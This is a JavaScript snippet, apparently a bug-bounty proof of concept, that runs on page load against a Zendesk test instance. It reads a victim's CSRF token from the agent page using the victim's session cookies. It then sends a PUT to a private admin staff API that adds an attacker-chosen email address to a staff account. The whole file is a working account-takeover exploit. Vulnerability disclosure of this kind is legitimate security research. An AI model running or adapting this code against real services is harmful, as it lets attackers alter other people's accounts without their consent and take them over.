        function performRequests() {
            var token;

            // Function to perform the GET request
            function getToken() {
                return new Promise((resolve, reject) => {
                    var xhttp = new XMLHttpRequest();
                    xhttp.open('GET', 'https://hackerone5759.zendesk.com/agent', true);
                    xhttp.withCredentials = true;

                    xhttp.onreadystatechange = function() {
                        if (xhttp.readyState === XMLHttpRequest.DONE) {
                            if (xhttp.status === 200) {
                                // Assuming the CSRF token is in a meta tag in the response
                                var parser = new DOMParser();
                                var doc = parser.parseFromString(xhttp.responseText, 'text/html');
                                var metaTag = doc.querySelector('meta[name="csrf-token"]');
                                if (metaTag) {
                                    token = metaTag.getAttribute('content');
                                    resolve(token);
                                } else {
                                    reject('CSRF token not found in the response');
                                }
                            } else {
                                reject('GET request failed with status: ' + xhttp.status);
                            }
                        }
                    };
                    xhttp.send();
                });
            }

            // Function to perform the PUT request
            function sendPutRequest(token) {
                var xhr = new XMLHttpRequest();
                xhr.open('PUT', 'https://hackerone5759.zendesk.com/api/admin/private/staff/19845800449181', true);
                xhr.setRequestHeader('Content-type', 'application/json');
                xhr.setRequestHeader('X-Csrf-Token', token);
                xhr.withCredentials = true;

                xhr.onreadystatechange = function() {
                    if (xhr.readyState === XMLHttpRequest.DONE) {
                        if (xhr.status === 200) {
                            console.log('PUT request successful');
                        } else {
                            console.error('PUT request failed with status: ' + xhr.status);
                        }
                    }
                };

                xhr.send('{"user":{},"emails":[{"id":"0","value":"tesdt@tesdt.com","_action":"create"}]}');
            }

            // Perform the GET request and then the PUT request
            getToken()
                .then((token) => {
                    console.log('CSRF token:', token);
                    sendPutRequest(token);
                })
                .catch((error) => {
                    console.error(error);
                });
        }

        window.onload = performRequests;
